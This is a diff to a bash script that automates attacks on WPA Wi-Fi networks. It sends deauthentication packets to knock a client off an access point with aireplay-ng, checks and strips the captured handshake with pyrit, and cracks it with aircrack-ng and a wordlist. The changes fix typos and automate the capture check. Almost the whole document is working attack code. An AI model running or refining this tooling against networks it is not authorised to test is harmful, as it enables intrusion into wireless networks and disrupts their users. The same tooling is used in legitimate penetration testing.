@@ -87,7 +87,7 @@ fcap()																	#Deauth, capture and strip handshakes
 			$COLOR 2;echo " [*] $CNT active clients found:";$COLOR 9
 			cat $HOME/tmp1
 			echo
-			$COLOR 4;echo " [>] Please paste clent MAC or Press Enter to use the first one:";$COLOR 9 
+			$COLOR 4;echo " [>] Please paste client MAC or Press Enter to use the first one:";$COLOR 9 
 			read -p "  >" CLIE
 	fi
 	if [ $CLIE -z ] 2> /dev/null
@@ -109,27 +109,20 @@ fcap()																	#Deauth, capture and strip handshakes
 			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE";$COLOR 9;$COLOR2 9
 			echo
 			$COLOR 1;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR 9
-			sleep 3
-			clear
-			echo "   [ WPA handshake: $BSSID"
 			echo
-			$COLOR 2;echo " [^] You should see this in the airodump-ng window [^]";$COLOR 9
-			$COLOR 4;echo " [>] was the hanshake successfully captured? [Y/n]: ";$COLOR 9
-			read -p "  >" WASCAP
-				case $WASCAP in
-					"Y")DONE="1";;
-					"y")DONE="1";;
-					"")DONE="1"
-				esac
+			$COLOR 4;echo " [*] Testing pcap for capture [*]";$COLOR 9
+			sleep 5
+			DONE=$(pyrit -r $HOME/tmp1-01.cap analyze | grep good)
+			sleep 0.5
 		done
-
+		
+	$COLOR 2;echo " [*] Capture was successful! "
 	killall airodump-ng
 	echo
 	$COLOR 4;echo "[*] Saving and Stripping capture, please wait... [*]"
 	echo
 	DATER=$( date +%Y_%m_%d_%H%M%S )
 	pyrit -r $HOME/tmp1-01.cap -o $HOME/Desktop/cap/handshakes/$FILENAME2-$DATER".cap" strip;$COLOR 9
-	rm $HOME/tmp1-01.cap
 	airmon-ng stop mon0&
 	rm -rf $HOME/tmp*
 	ISGOOD=$(pyrit -r $HOME/Desktop/cap/handshakes/$FILENAME2-$DATER".cap" analyze | grep good)
@@ -162,7 +155,7 @@ fcap()																	#Deauth, capture and strip handshakes
 			rm -rf $HOME/Desktop/cap/handshakes/$FILENAME2-$DATER".cap"
 			echo
 	fi
-	exit
+	fexit
 }
 
 fcrack()																#Crack handshakes
@@ -175,13 +168,14 @@ fcrack()																#Crack handshakes
 	fi
 	if [ ! -f $WORDLIST ] 2> /dev/null
 		then
-			$COLOR 1;echo " [*] ERROR $WORLIST not found, try again..";$COLOR 9
+			$COLOR 1;echo " [*] ERROR: $WORDLIST not found, try again..";$COLOR 9
 			WORDLIST=""
 			sleep 1
 			fcrack
 		else
 			aircrack-ng -w $WORDLIST $HOME/Desktop/cap/handshakes/$FILENAME2-$DATER".cap"
 	fi
+	fexit
 }
 
 fexit()																	#Exit
